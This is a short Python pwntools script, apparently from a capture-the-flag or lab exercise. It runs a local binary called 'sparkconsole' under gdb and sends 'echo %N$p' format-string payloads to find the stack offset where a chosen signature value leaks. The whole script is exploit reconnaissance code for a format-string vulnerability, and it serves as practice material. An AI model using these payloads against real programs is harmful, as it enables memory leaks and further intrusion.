from pwn import *
context.arch = 'i386'

binary = ELF('./sparkconsole')
p = process(binary.path)

p: process = gdb.debug(binary.path,'''
    b main
    c
''')

p.recvuntil(b'$ ')
sig = input('sig: ')

for i in range(1, 200):
    payload = b'echo %' + str(i).encode() + b'$p'
    p.sendline(payload)
    recv = p.recvuntil(b'\n$', drop=True).strip()
    if sig in recv.decode():
        log.success(f'Found {recv.decode()} at sequence {i}')
        break
    log.info(recv)